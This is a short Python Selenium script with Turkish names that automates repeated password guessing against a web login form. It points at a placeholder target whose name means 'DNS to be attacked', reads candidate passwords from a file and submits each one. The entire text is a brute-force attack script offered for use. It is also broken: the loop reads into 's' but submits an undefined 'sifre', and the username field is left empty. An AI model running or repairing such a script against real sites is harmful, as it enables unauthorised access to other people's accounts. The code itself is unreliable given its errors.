from selenium import webdriver
import time

browser = webdriver.Firefox()

browser.get('https://www.saldırıYapilacakDNS.com/')

time.sleep(3)

kullanici_adi = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
kullanici_sifre = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
giris = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]/button')
dosya = open('sifre.txt','r')
time.sleep(3)
for s in dosya:
    kullanici_adi.send_keys('')
    kullanici_sifre.send_keys(sifre)
    print(sifre)
    giris.click()
    time.sleep(2)
    browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input').clear()
    browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input').clear()

dosya.close()
